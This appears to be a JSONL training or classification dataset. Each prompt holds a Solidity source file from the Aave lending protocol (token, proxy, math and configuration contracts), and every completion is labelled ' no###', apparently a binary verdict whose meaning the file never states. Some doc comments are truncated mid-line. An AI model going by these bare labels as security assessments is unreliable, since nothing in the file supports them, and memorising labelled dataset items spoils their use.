{"prompt": "pragma solidity 0.6.12; \n \ninterface IScaledBalanceToken { \n /** \n * @dev Returns the scaled balance of the user. The scaled balance is the sum of all the \n * updated stored balance divided by the reserve's liquidity index at the moment of the update \n * @param user The user whose balance is calculated \n * @return The scaled balance of the user \n **/ \n function scaledBalanceOf(address user) external view returns (uint256); \n \n /** \n * @dev Returns the scaled balance of the user and the scaled total supply. \n * @param user The address of the user \n * @return The scaled balance of the user \n * @return The scaled balance and the scaled total supply \n **/ \n function getScaledUserBalanceAndSupply(address user) external view returns (uint256, uint256); \n \n /** \n * @dev Returns the scaled total supply of the variable debt token. Represents sum(debt/index) \n * @return The scaled total supply \n **/ \n function scaledTotalSupply() external view returns (uint256); \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {IERC20} from '../dependencies/openzeppelin/contracts/IERC20.sol'; \n \ninterface IERC20WithPermit is IERC20 { \n function permit( \n address owner, \n address spender, \n uint256 value, \n uint256 deadline, \n uint8 v, \n bytes32 r, \n bytes32 s \n ) external; \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \npragma experimental ABIEncoderV2; \n \nimport {IPriceOracleGetter} from '../../interfaces/IPriceOracleGetter.sol'; \nimport {IUniswapV2Router02} from '../../interfaces/IUniswapV2Router02.sol'; \n \ninterface IBaseUniswapAdapter { \n event Swapped(address fromAsset, address toAsset, uint256 fromAmount, uint256 receivedAmount); \n \n struct PermitSignature { \n uint256 amount; \n uint256 deadline; \n uint8 v; \n bytes32 r; \n bytes32 s; \n } \n \n struct AmountCalc { \n uint256 calculatedAmount; \n uint256 relativePrice; \n uint256 amountInUsd; \n uint256 amountOutUsd; \n address[] path; \n } \n \n function WETH_ADDRESS() external returns (address); \n \n function MAX_SLIPPAGE_PERCENT() external returns (uint256); \n \n function FLASHLOAN_PREMIUM_TOTAL() external returns (uint256); \n \n function USD_ADDRESS() external returns (address); \n \n function ORACLE() external returns (IPriceOracleGetter); \n \n function UNISWAP_ROUTER() external returns (IUniswapV2Router02); \n \n /** \n * @dev Given an input asset amount, returns the maximum output amount of the other asset and the p\n * @param amountIn Amount of reserveIn \n * @param reserveIn Address of the asset to be swap from \n * @param reserveOut Address of the asset to be swap to \n * @return uint256 Amount out of the reserveOut \n * @return uint256 The price of out amount denominated in the reserveIn currency (18 decimals) \n * @return uint256 In amount of reserveIn value denominated in USD (8 decimals) \n * @return uint256 Out amount of reserveOut value denominated in USD (8 decimals) \n * @return address[] The exchange path \n */ \n function getAmountsOut( \n uint256 amountIn, \n address reserveIn, \n address reserveOut \n ) \n external \n view \n returns ( \n uint256, \n uint256, \n uint256, \n uint256, \n address[] memory \n ); \n \n /** \n * @dev Returns the minimum input asset amount required to buy the given output asset amount and th\n * @param amountOut Amount of reserveOut \n * @param reserveIn Address of the asset to be swap from \n * @param reserveOut Address of the asset to be swap to \n * @return uint256 Amount in of the reserveIn \n * @return uint256 The price of in amount denominated in the reserveOut currency (18 decimals) \n * @return uint256 In amount of reserveIn value denominated in USD (8 decimals) \n * @return uint256 Out amount of reserveOut value denominated in USD (8 decimals) \n * @return address[] The exchange path \n */ \n function getAmountsIn( \n uint256 amountOut, \n address reserveIn, \n address reserveOut \n ) \n external \n view \n returns ( \n uint256, \n uint256, \n uint256, \n uint256, \n address[] memory \n ); \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {UserConfiguration} from '../libraries/configuration/UserConfiguration.sol'; \nimport {ReserveConfiguration} from '../libraries/configuration/ReserveConfiguration.sol'; \nimport {ReserveLogic} from '../libraries/logic/ReserveLogic.sol'; \nimport {ILendingPoolAddressesProvider} from '../../interfaces/ILendingPoolAddressesProvider.sol'; \nimport {DataTypes} from '../libraries/types/DataTypes.sol'; \n \ncontract LendingPoolStorage { \n using ReserveLogic for DataTypes.ReserveData; \n using ReserveConfiguration for DataTypes.ReserveConfigurationMap; \n using UserConfiguration for DataTypes.UserConfigurationMap; \n \n ILendingPoolAddressesProvider internal _addressesProvider; \n \n mapping(address => DataTypes.ReserveData) internal _reserves; \n mapping(address => DataTypes.UserConfigurationMap) internal _usersConfig; \n \n // the list of the available reserves, structured as a mapping for gas savings reasons \n mapping(uint256 => address) internal _reservesList; \n \n uint256 internal _reservesCount; \n \n bool internal _paused; \n \n uint256 internal _maxStableRateBorrowSizePercent; \n \n uint256 internal _flashLoanPremiumTotal; \n \n uint256 internal _maxNumberOfReserves; \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {ILendingPool} from '../../../interfaces/ILendingPool.sol'; \nimport {ICreditDelegationToken} from '../../../interfaces/ICreditDelegationToken.sol'; \nimport { \n VersionedInitializable \n} from '../../libraries/aave-upgradeability/VersionedInitializable.sol'; \nimport {IncentivizedERC20} from '../IncentivizedERC20.sol'; \nimport {Errors} from '../../libraries/helpers/Errors.sol'; \n \n/** \n * @title DebtTokenBase \n * @notice Base contract for different types of debt tokens, like StableDebtToken or VariableDebtToke\n * @author Aave \n */ \n \nabstract contract DebtTokenBase is \n IncentivizedERC20('DEBTTOKEN_IMPL', 'DEBTTOKEN_IMPL', 0), \n VersionedInitializable, \n ICreditDelegationToken \n{ \n mapping(address => mapping(address => uint256)) internal _borrowAllowances; \n \n /** \n * @dev Only lending pool can call functions marked by this modifier \n **/ \n modifier onlyLendingPool { \n require(_msgSender() == address(_getLendingPool()), Errors.CT_CALLER_MUST_BE_LENDING_POOL); \n _; \n } \n \n /** \n * @dev delegates borrowing power to a user on the specific debt token \n * @param delegatee the address receiving the delegated borrowing power \n * @param amount the maximum amount being delegated. Delegation will still \n * respect the liquidation constraints (even if delegated, a delegatee cannot \n * force a delegator HF to go below 1) \n **/ \n function approveDelegation(address delegatee, uint256 amount) external override { \n _borrowAllowances[_msgSender()][delegatee] = amount; \n emit BorrowAllowanceDelegated(_msgSender(), delegatee, _getUnderlyingAssetAddress(), amount); \n } \n \n /** \n * @dev returns the borrow allowance of the user \n * @param fromUser The user to giving allowance \n * @param toUser The user to give allowance to \n * @return the current allowance of toUser \n **/ \n function borrowAllowance(address fromUser, address toUser) \n external \n view \n override \n returns (uint256) \n { \n return _borrowAllowances[fromUser][toUser]; \n } \n \n /** \n * @dev Being non transferrable, the debt token does not implement any of the \n * standard ERC20 functions for transfer and allowance. \n **/ \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) { \n recipient; \n amount; \n revert('TRANSFER_NOT_SUPPORTED'); \n } \n \n function allowance(address owner, address spender) \n public \n view \n virtual \n override \n returns (uint256) \n { \n owner; \n spender; \n revert('ALLOWANCE_NOT_SUPPORTED'); \n } \n \n function approve(address spender, uint256 amount) public virtual override returns (bool) { \n spender; \n amount; \n revert('APPROVAL_NOT_SUPPORTED'); \n } \n \n function transferFrom( \n address sender, \n address recipient, \n uint256 amount \n ) public virtual override returns (bool) { \n sender; \n recipient; \n amount; \n revert('TRANSFER_NOT_SUPPORTED'); \n } \n \n function increaseAllowance(address spender, uint256 addedValue) \n public \n virtual \n override \n returns (bool) \n { \n spender; \n addedValue; \n revert('ALLOWANCE_NOT_SUPPORTED'); \n } \n \n function decreaseAllowance(address spender, uint256 subtractedValue) \n public \n virtual \n override \n returns (bool) \n { \n spender; \n subtractedValue; \n revert('ALLOWANCE_NOT_SUPPORTED'); \n } \n \n function _decreaseBorrowAllowance( \n address delegator, \n address delegatee, \n uint256 amount \n ) internal { \n uint256 newAllowance = \n _borrowAllowances[delegator][delegatee].sub(amount, Errors.BORROW_ALLOWANCE_NOT_ENOUGH); \n \n _borrowAllowances[delegator][delegatee] = newAllowance; \n \n emit BorrowAllowanceDelegated(delegator, delegatee, _getUnderlyingAssetAddress(), newAllowance); \n } \n \n function _getUnderlyingAssetAddress() internal view virtual returns (address); \n \n function _getLendingPool() internal view virtual returns (ILendingPool); \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {ILendingPool} from '../../interfaces/ILendingPool.sol'; \nimport {IDelegationToken} from '../../interfaces/IDelegationToken.sol'; \nimport {Errors} from '../libraries/helpers/Errors.sol'; \nimport {AToken} from './AToken.sol'; \n \n/** \n * @title Aave AToken enabled to delegate voting power of the underlying asset to a different address\n * @dev The underlying asset needs to be compatible with the COMP delegation interface \n * @author Aave \n */ \ncontract DelegationAwareAToken is AToken { \n modifier onlyPoolAdmin { \n require( \n _msgSender() == ILendingPool(_pool).getAddressesProvider().getPoolAdmin(), \n Errors.CALLER_NOT_POOL_ADMIN \n ); \n _; \n } \n \n /** \n * @dev Delegates voting power of the underlying asset to a `delegatee` address \n * @param delegatee The address that will receive the delegation \n **/ \n function delegateUnderlyingTo(address delegatee) external onlyPoolAdmin { \n IDelegationToken(_underlyingAsset).delegate(delegatee); \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {IERC20} from '../../../dependencies/openzeppelin/contracts/IERC20.sol'; \nimport {DataTypes} from '../types/DataTypes.sol'; \n \n/** \n * @title Helpers library \n * @author Aave \n */ \nlibrary Helpers { \n /** \n * @dev Fetches the user current stable and variable debt balances \n * @param user The user address \n * @param reserve The reserve data object \n * @return The stable and variable debt balance \n **/ \n function getUserCurrentDebt(address user, DataTypes.ReserveData storage reserve) \n internal \n view \n returns (uint256, uint256) \n { \n return ( \n IERC20(reserve.stableDebtTokenAddress).balanceOf(user), \n IERC20(reserve.variableDebtTokenAddress).balanceOf(user) \n ); \n } \n \n function getUserCurrentDebtMemory(address user, DataTypes.ReserveData memory reserve) \n internal \n view \n returns (uint256, uint256) \n { \n return ( \n IERC20(reserve.stableDebtTokenAddress).balanceOf(user), \n IERC20(reserve.variableDebtTokenAddress).balanceOf(user) \n ); \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \n/** \n * @title VersionedInitializable \n * \n * @dev Helper contract to implement initializer functions. To use it, replace \n * the constructor with a function that has the `initializer` modifier. \n * WARNING: Unlike constructors, initializer functions must be manually \n * invoked. This applies both to deploying an Initializable contract, as well \n * as extending an Initializable contract via inheritance. \n * WARNING: When used with inheritance, manual care must be taken to not invoke \n * a parent initializer twice, or ensure that all initializers are idempotent, \n * because this is not dealt with automatically as with constructors. \n * \n * @author Aave, inspired by the OpenZeppelin Initializable contract \n */ \nabstract contract VersionedInitializable { \n /** \n * @dev Indicates that the contract has been initialized. \n */ \n uint256 private lastInitializedRevision = 0; \n \n /** \n * @dev Indicates that the contract is in the process of being initialized. \n */ \n bool private initializing; \n \n /** \n * @dev Modifier to use in the initializer function of a contract. \n */ \n modifier initializer() { \n uint256 revision = getRevision(); \n require( \n initializing || isConstructor() || revision > lastInitializedRevision, \n 'Contract instance has already been initialized' \n ); \n \n bool isTopLevelCall = !initializing; \n if (isTopLevelCall) { \n initializing = true; \n lastInitializedRevision = revision; \n } \n \n _; \n \n if (isTopLevelCall) { \n initializing = false; \n } \n } \n \n /** \n * @dev returns the revision number of the contract \n * Needs to be defined in the inherited class as a constant. \n **/ \n function getRevision() internal pure virtual returns (uint256); \n \n /** \n * @dev Returns true if and only if the function is running in the constructor \n **/ \n function isConstructor() private view returns (bool) { \n // extcodesize checks the size of the code stored in an address, and \n // address returns the current address. Since the code is still not \n // deployed when running a constructor, any checks on its code size will \n // yield zero, making it an effective way to detect if a contract is \n // under construction or not. \n uint256 cs; \n //solium-disable-next-line \n assembly { \n cs := extcodesize(address()) \n } \n return cs == 0; \n } \n \n // Reserved storage space to allow for layout changes in the future. \n uint256[50] private ______gap; \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport './BaseImmutableAdminUpgradeabilityProxy.sol'; \nimport '../../../dependencies/openzeppelin/upgradeability/InitializableUpgradeabilityProxy.sol'; \n \n/** \n * @title InitializableAdminUpgradeabilityProxy \n * @dev Extends BaseAdminUpgradeabilityProxy with an initializer function \n */ \ncontract InitializableImmutableAdminUpgradeabilityProxy is \n BaseImmutableAdminUpgradeabilityProxy, \n InitializableUpgradeabilityProxy \n{ \n constructor(address admin) public BaseImmutableAdminUpgradeabilityProxy(admin) {} \n \n /** \n * @dev Only fall back when the sender is not the admin. \n */ \n function _willFallback() internal override(BaseImmutableAdminUpgradeabilityProxy, Proxy) { \n BaseImmutableAdminUpgradeabilityProxy._willFallback(); \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport '../../../dependencies/openzeppelin/upgradeability/BaseUpgradeabilityProxy.sol'; \n \n/** \n * @title BaseImmutableAdminUpgradeabilityProxy \n * @author Aave, inspired by the OpenZeppelin upgradeability proxy pattern \n * @dev This contract combines an upgradeability proxy with an authorization \n * mechanism for administrative tasks. The admin role is stored in an immutable, which \n * helps saving transactions costs \n * All external functions in this contract must be guarded by the \n * `ifAdmin` modifier. See ethereum/solidity#3864 for a Solidity \n * feature proposal that would enable this to be done automatically. \n */ \ncontract BaseImmutableAdminUpgradeabilityProxy is BaseUpgradeabilityProxy { \n address immutable ADMIN; \n \n constructor(address admin) public { \n ADMIN = admin; \n } \n \n modifier ifAdmin() { \n if (msg.sender == ADMIN) { \n _; \n } else { \n _fallback(); \n } \n } \n \n /** \n * @return The address of the proxy admin. \n */ \n function admin() external ifAdmin returns (address) { \n return ADMIN; \n } \n \n /** \n * @return The address of the implementation. \n */ \n function implementation() external ifAdmin returns (address) { \n return _implementation(); \n } \n \n /** \n * @dev Upgrade the backing implementation of the proxy. \n * Only the admin can call this function. \n * @param newImplementation Address of the new implementation. \n */ \n function upgradeTo(address newImplementation) external ifAdmin { \n _upgradeTo(newImplementation); \n } \n \n /** \n * @dev Upgrade the backing implementation of the proxy and call a function \n * on the new implementation. \n * This is useful to initialize the proxied contract. \n * @param newImplementation Address of the new implementation. \n * @param data Data to send as msg.data in the low level call. \n * It should include the signature and the parameters of the function to be called, as described in\n * https://solidity.readthedocs.io/en/v0.4.24/abi-spec.html#function-selector-and-argument-encoding\n */ \n function upgradeToAndCall(address newImplementation, bytes calldata data) \n external \n payable \n ifAdmin \n { \n _upgradeTo(newImplementation); \n (bool success, ) = newImplementation.delegatecall(data); \n require(success); \n } \n \n /** \n * @dev Only fall back when the sender is not the admin. \n */ \n function _willFallback() internal virtual override { \n require(msg.sender != ADMIN, 'Cannot call fallback function from the proxy admin'); \n super._willFallback(); \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {Errors} from '../helpers/Errors.sol'; \n \n/** \n * @title PercentageMath library \n * @author Aave \n * @notice Provides functions to perform percentage calculations \n * @dev Percentages are defined by default with 2 decimals of precision (100.00). The precision is in\n * @dev Operations are rounded half up \n **/ \n \nlibrary PercentageMath { \n uint256 constant PERCENTAGE_FACTOR = 1e4; //percentage plus two decimals \n uint256 constant HALF_PERCENT = PERCENTAGE_FACTOR / 2; \n \n /** \n * @dev Executes a percentage multiplication \n * @param value The value of which the percentage needs to be calculated \n * @param percentage The percentage of the value to be calculated \n * @return The percentage of value \n **/ \n function percentMul(uint256 value, uint256 percentage) internal pure returns (uint256) { \n if (value == 0 || percentage == 0) { \n return 0; \n } \n \n require( \n value <= (type(uint256).max - HALF_PERCENT) / percentage, \n Errors.MATH_MULTIPLICATION_OVERFLOW \n ); \n \n return (value * percentage + HALF_PERCENT) / PERCENTAGE_FACTOR; \n } \n \n /** \n * @dev Executes a percentage division \n * @param value The value of which the percentage needs to be calculated \n * @param percentage The percentage of the value to be calculated \n * @return The value divided the percentage \n **/ \n function percentDiv(uint256 value, uint256 percentage) internal pure returns (uint256) { \n require(percentage != 0, Errors.MATH_DIVISION_BY_ZERO); \n uint256 halfPercentage = percentage / 2; \n \n require( \n value <= (type(uint256).max - halfPercentage) / PERCENTAGE_FACTOR, \n Errors.MATH_MULTIPLICATION_OVERFLOW \n ); \n \n return (value * PERCENTAGE_FACTOR + halfPercentage) / percentage; \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {Errors} from '../helpers/Errors.sol'; \n \n/** \n * @title WadRayMath library \n * @author Aave \n * @dev Provides mul and div function for wads (decimal numbers with 18 digits precision) and rays (d\n **/ \n \nlibrary WadRayMath { \n uint256 internal constant WAD = 1e18; \n uint256 internal constant halfWAD = WAD / 2; \n \n uint256 internal constant RAY = 1e27; \n uint256 internal constant halfRAY = RAY / 2; \n \n uint256 internal constant WAD_RAY_RATIO = 1e9; \n \n /** \n * @return One ray, 1e27 \n **/ \n function ray() internal pure returns (uint256) { \n return RAY; \n } \n \n /** \n * @return One wad, 1e18 \n **/ \n \n function wad() internal pure returns (uint256) { \n return WAD; \n } \n \n /** \n * @return Half ray, 1e27/2 \n **/ \n function halfRay() internal pure returns (uint256) { \n return halfRAY; \n } \n \n /** \n * @return Half ray, 1e18/2 \n **/ \n function halfWad() internal pure returns (uint256) { \n return halfWAD; \n } \n \n /** \n * @dev Multiplies two wad, rounding half up to the nearest wad \n * @param a Wad \n * @param b Wad \n * @return The result of a*b, in wad \n **/ \n function wadMul(uint256 a, uint256 b) internal pure returns (uint256) { \n if (a == 0 || b == 0) { \n return 0; \n } \n \n require(a <= (type(uint256).max - halfWAD) / b, Errors.MATH_MULTIPLICATION_OVERFLOW); \n \n return (a * b + halfWAD) / WAD; \n } \n \n /** \n * @dev Divides two wad, rounding half up to the nearest wad \n * @param a Wad \n * @param b Wad \n * @return The result of a/b, in wad \n **/ \n function wadDiv(uint256 a, uint256 b) internal pure returns (uint256) { \n require(b != 0, Errors.MATH_DIVISION_BY_ZERO); \n uint256 halfB = b / 2; \n \n require(a <= (type(uint256).max - halfB) / WAD, Errors.MATH_MULTIPLICATION_OVERFLOW); \n \n return (a * WAD + halfB) / b; \n } \n \n /** \n * @dev Multiplies two ray, rounding half up to the nearest ray \n * @param a Ray \n * @param b Ray \n * @return The result of a*b, in ray \n **/ \n function rayMul(uint256 a, uint256 b) internal pure returns (uint256) { \n if (a == 0 || b == 0) { \n return 0; \n } \n \n require(a <= (type(uint256).max - halfRAY) / b, Errors.MATH_MULTIPLICATION_OVERFLOW); \n \n return (a * b + halfRAY) / RAY; \n } \n \n /** \n * @dev Divides two ray, rounding half up to the nearest ray \n * @param a Ray \n * @param b Ray \n * @return The result of a/b, in ray \n **/ \n function rayDiv(uint256 a, uint256 b) internal pure returns (uint256) { \n require(b != 0, Errors.MATH_DIVISION_BY_ZERO); \n uint256 halfB = b / 2; \n \n require(a <= (type(uint256).max - halfB) / RAY, Errors.MATH_MULTIPLICATION_OVERFLOW); \n \n return (a * RAY + halfB) / b; \n } \n \n /** \n * @dev Casts ray down to wad \n * @param a Ray \n * @return a casted to wad, rounded half up to the nearest wad \n **/ \n function rayToWad(uint256 a) internal pure returns (uint256) { \n uint256 halfRatio = WAD_RAY_RATIO / 2; \n uint256 result = halfRatio + a; \n require(result >= halfRatio, Errors.MATH_ADDITION_OVERFLOW); \n \n return result / WAD_RAY_RATIO; \n } \n \n /** \n * @dev Converts wad up to ray \n * @param a Wad \n * @return a converted in ray \n **/ \n function wadToRay(uint256 a) internal pure returns (uint256) { \n uint256 result = a * WAD_RAY_RATIO; \n require(result / WAD_RAY_RATIO == a, Errors.MATH_MULTIPLICATION_OVERFLOW); \n return result; \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {SafeMath} from '../../../dependencies/openzeppelin/contracts/SafeMath.sol'; \nimport {WadRayMath} from './WadRayMath.sol'; \n \nlibrary MathUtils { \n using SafeMath for uint256; \n using WadRayMath for uint256; \n \n /// @dev Ignoring leap years \n uint256 internal constant SECONDS_PER_YEAR = 365 days; \n \n /** \n * @dev Function to calculate the interest accumulated using a linear interest rate formula \n * @param rate The interest rate, in ray \n * @param lastUpdateTimestamp The timestamp of the last update of the interest \n * @return The interest rate linearly accumulated during the timeDelta, in ray \n **/ \n \n function calculateLinearInterest(uint256 rate, uint40 lastUpdateTimestamp) \n internal \n view \n returns (uint256) \n { \n //solium-disable-next-line \n uint256 timeDifference = block.timestamp.sub(uint256(lastUpdateTimestamp)); \n \n return (rate.mul(timeDifference) / SECONDS_PER_YEAR).add(WadRayMath.ray()); \n } \n \n /** \n * @dev Function to calculate the interest using a compounded interest rate formula \n * To avoid expensive exponentiation, the calculation is performed using a binomial approximation: \n * \n * (1+x)^n = 1+n*x+[n/2*(n-1)]*x^2+[n/6*(n-1)*(n-2)*x^3... \n * \n * The approximation slightly underpays liquidity providers and undercharges borrowers, with the ad\n * The whitepaper contains reference to the approximation and a table showing the margin of error p\n * \n * @param rate The interest rate, in ray \n * @param lastUpdateTimestamp The timestamp of the last update of the interest \n * @return The interest rate compounded during the timeDelta, in ray \n **/ \n function calculateCompoundedInterest( \n uint256 rate, \n uint40 lastUpdateTimestamp, \n uint256 currentTimestamp \n ) internal pure returns (uint256) { \n //solium-disable-next-line \n uint256 exp = currentTimestamp.sub(uint256(lastUpdateTimestamp)); \n \n if (exp == 0) { \n return WadRayMath.ray(); \n } \n \n uint256 expMinusOne = exp - 1; \n \n uint256 expMinusTwo = exp > 2 ? exp - 2 : 0; \n \n uint256 ratePerSecond = rate / SECONDS_PER_YEAR; \n \n uint256 basePowerTwo = ratePerSecond.rayMul(ratePerSecond); \n uint256 basePowerThree = basePowerTwo.rayMul(ratePerSecond); \n \n uint256 secondTerm = exp.mul(expMinusOne).mul(basePowerTwo) / 2; \n uint256 thirdTerm = exp.mul(expMinusOne).mul(expMinusTwo).mul(basePowerThree) / 6; \n \n return WadRayMath.ray().add(ratePerSecond.mul(exp)).add(secondTerm).add(thirdTerm); \n } \n \n /** \n * @dev Calculates the compounded interest between the timestamp of the last update and the current \n * @param rate The interest rate (in ray) \n * @param lastUpdateTimestamp The timestamp from which the interest accumulation needs to be calcul\n **/ \n function calculateCompoundedInterest(uint256 rate, uint40 lastUpdateTimestamp) \n internal \n view \n returns (uint256) \n { \n return calculateCompoundedInterest(rate, lastUpdateTimestamp, block.timestamp); \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nlibrary DataTypes { \n // refer to the whitepaper, section 1.1 basic concepts for a formal description of these properties\n struct ReserveData { \n //stores the reserve configuration \n ReserveConfigurationMap configuration; \n //the liquidity index. Expressed in ray \n uint128 liquidityIndex; \n //variable borrow index. Expressed in ray \n uint128 variableBorrowIndex; \n //the current supply rate. Expressed in ray \n uint128 currentLiquidityRate; \n //the current variable borrow rate. Expressed in ray \n uint128 currentVariableBorrowRate; \n //the current stable borrow rate. Expressed in ray \n uint128 currentStableBorrowRate; \n uint40 lastUpdateTimestamp; \n //tokens addresses \n address aTokenAddress; \n address stableDebtTokenAddress; \n address variableDebtTokenAddress; \n //address of the interest rate strategy \n address interestRateStrategyAddress; \n //the id of the reserve. Represents the position in the list of the active reserves \n uint8 id; \n } \n \n struct ReserveConfigurationMap { \n //bit 0-15: LTV \n //bit 16-31: Liq. threshold \n //bit 32-47: Liq. bonus \n //bit 48-55: Decimals \n //bit 56: Reserve is active \n //bit 57: reserve is frozen \n //bit 58: borrowing is enabled \n //bit 59: stable rate borrowing enabled \n //bit 60-63: reserved \n //bit 64-79: reserve factor \n uint256 data; \n } \n \n struct UserConfigurationMap { \n uint256 data; \n } \n \n enum InterestRateMode {NONE, STABLE, VARIABLE} \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {Errors} from '../helpers/Errors.sol'; \nimport {DataTypes} from '../types/DataTypes.sol'; \n \n/** \n * @title UserConfiguration library \n * @author Aave \n * @notice Implements the bitmap logic to handle the user configuration \n */ \nlibrary UserConfiguration { \n uint256 internal constant BORROWING_MASK = \n 0x5555555555555555555555555555555555555555555555555555555555555555; \n \n /** \n * @dev Sets if the user is borrowing the reserve identified by reserveIndex \n * @param self The configuration object \n * @param reserveIndex The index of the reserve in the bitmap \n * @param borrowing True if the user is borrowing the reserve, false otherwise \n **/ \n function setBorrowing( \n DataTypes.UserConfigurationMap storage self, \n uint256 reserveIndex, \n bool borrowing \n ) internal { \n require(reserveIndex < 128, Errors.UL_INVALID_INDEX); \n self.data = \n (self.data & ~(1 << (reserveIndex * 2))) | \n (uint256(borrowing ? 1 : 0) << (reserveIndex * 2)); \n } \n \n /** \n * @dev Sets if the user is using as collateral the reserve identified by reserveIndex \n * @param self The configuration object \n * @param reserveIndex The index of the reserve in the bitmap \n * @param usingAsCollateral True if the user is usin the reserve as collateral, false otherwise \n **/ \n function setUsingAsCollateral( \n DataTypes.UserConfigurationMap storage self, \n uint256 reserveIndex, \n bool usingAsCollateral \n ) internal { \n require(reserveIndex < 128, Errors.UL_INVALID_INDEX); \n self.data = \n (self.data & ~(1 << (reserveIndex * 2 + 1))) | \n (uint256(usingAsCollateral ? 1 : 0) << (reserveIndex * 2 + 1)); \n } \n \n /** \n * @dev Used to validate if a user has been using the reserve for borrowing or as collateral \n * @param self The configuration object \n * @param reserveIndex The index of the reserve in the bitmap \n * @return True if the user has been using a reserve for borrowing or as collateral, false otherwis\n **/ \n function isUsingAsCollateralOrBorrowing( \n DataTypes.UserConfigurationMap memory self, \n uint256 reserveIndex \n ) internal pure returns (bool) { \n require(reserveIndex < 128, Errors.UL_INVALID_INDEX); \n return (self.data >> (reserveIndex * 2)) & 3 != 0; \n } \n \n /** \n * @dev Used to validate if a user has been using the reserve for borrowing \n * @param self The configuration object \n * @param reserveIndex The index of the reserve in the bitmap \n * @return True if the user has been using a reserve for borrowing, false otherwise \n **/ \n function isBorrowing(DataTypes.UserConfigurationMap memory self, uint256 reserveIndex) \n internal \n pure \n returns (bool) \n { \n require(reserveIndex < 128, Errors.UL_INVALID_INDEX); \n return (self.data >> (reserveIndex * 2)) & 1 != 0; \n } \n \n /** \n * @dev Used to validate if a user has been using the reserve as collateral \n * @param self The configuration object \n * @param reserveIndex The index of the reserve in the bitmap \n * @return True if the user has been using a reserve as collateral, false otherwise \n **/ \n function isUsingAsCollateral(DataTypes.UserConfigurationMap memory self, uint256 reserveIndex) \n internal \n pure \n returns (bool) \n { \n require(reserveIndex < 128, Errors.UL_INVALID_INDEX); \n return (self.data >> (reserveIndex * 2 + 1)) & 1 != 0; \n } \n \n /** \n * @dev Used to validate if a user has been borrowing from any reserve \n * @param self The configuration object \n * @return True if the user has been borrowing any reserve, false otherwise \n **/ \n function isBorrowingAny(DataTypes.UserConfigurationMap memory self) internal pure returns (bool) { \n return self.data & BORROWING_MASK != 0; \n } \n \n /** \n * @dev Used to validate if a user has not been using any reserve \n * @param self The configuration object \n * @return True if the user has been borrowing any reserve, false otherwise \n **/ \n function isEmpty(DataTypes.UserConfigurationMap memory self) internal pure returns (bool) { \n return self.data == 0; \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
{"prompt": "pragma solidity 0.6.12; \n \nimport {Ownable} from '../../dependencies/openzeppelin/contracts/Ownable.sol'; \nimport { \n ILendingPoolAddressesProviderRegistry \n} from '../../interfaces/ILendingPoolAddressesProviderRegistry.sol'; \nimport {Errors} from '../libraries/helpers/Errors.sol'; \n \n/** \n * @title LendingPoolAddressesProviderRegistry contract \n * @dev Main registry of LendingPoolAddressesProvider of multiple Aave protocol's markets \n * - Used for indexing purposes of Aave protocol's markets \n * - The id assigned to a LendingPoolAddressesProvider refers to the market it is connected with, \n * for example with `0` for the Aave main market and `1` for the next created \n * @author Aave \n **/ \ncontract LendingPoolAddressesProviderRegistry is Ownable, ILendingPoolAddressesProviderRegistry { \n mapping(address => uint256) private _addressesProviders; \n address[] private _addressesProvidersList; \n \n /** \n * @dev Returns the list of registered addresses provider \n * @return The list of addresses provider, potentially containing address(0) elements \n **/ \n function getAddressesProvidersList() external view override returns (address[] memory) { \n address[] memory addressesProvidersList = _addressesProvidersList; \n \n uint256 maxLength = addressesProvidersList.length; \n \n address[] memory activeProviders = new address[](maxLength); \n \n for (uint256 i = 0; i < maxLength; i++) { \n if (_addressesProviders[addressesProvidersList[i]] > 0) { \n activeProviders[i] = addressesProvidersList[i]; \n } \n } \n \n return activeProviders; \n } \n \n /** \n * @dev Registers an addresses provider \n * @param provider The address of the new LendingPoolAddressesProvider \n * @param id The id for the new LendingPoolAddressesProvider, referring to the market it belongs to\n **/ \n function registerAddressesProvider(address provider, uint256 id) external override onlyOwner { \n require(id != 0, Errors.LPAPR_INVALID_ADDRESSES_PROVIDER_ID); \n \n _addressesProviders[provider] = id; \n _addToAddressesProvidersList(provider); \n emit AddressesProviderRegistered(provider); \n } \n \n /** \n * @dev Removes a LendingPoolAddressesProvider from the list of registered addresses provider \n * @param provider The LendingPoolAddressesProvider address \n **/ \n function unregisterAddressesProvider(address provider) external override onlyOwner { \n require(_addressesProviders[provider] > 0, Errors.LPAPR_PROVIDER_NOT_REGISTERED); \n _addressesProviders[provider] = 0; \n emit AddressesProviderUnregistered(provider); \n } \n \n /** \n * @dev Returns the id on a registered LendingPoolAddressesProvider \n * @return The id or 0 if the LendingPoolAddressesProvider is not registered \n */ \n function getAddressesProviderIdByAddress(address addressesProvider) \n external \n view \n override \n returns (uint256) \n { \n return _addressesProviders[addressesProvider]; \n } \n \n function _addToAddressesProvidersList(address provider) internal { \n uint256 providersCount = _addressesProvidersList.length; \n \n for (uint256 i = 0; i < providersCount; i++) { \n if (_addressesProvidersList[i] == provider) { \n return; \n } \n } \n \n _addressesProvidersList.push(provider); \n } \n} \n\n\n###\n\n", "completion": " no###\n###"}
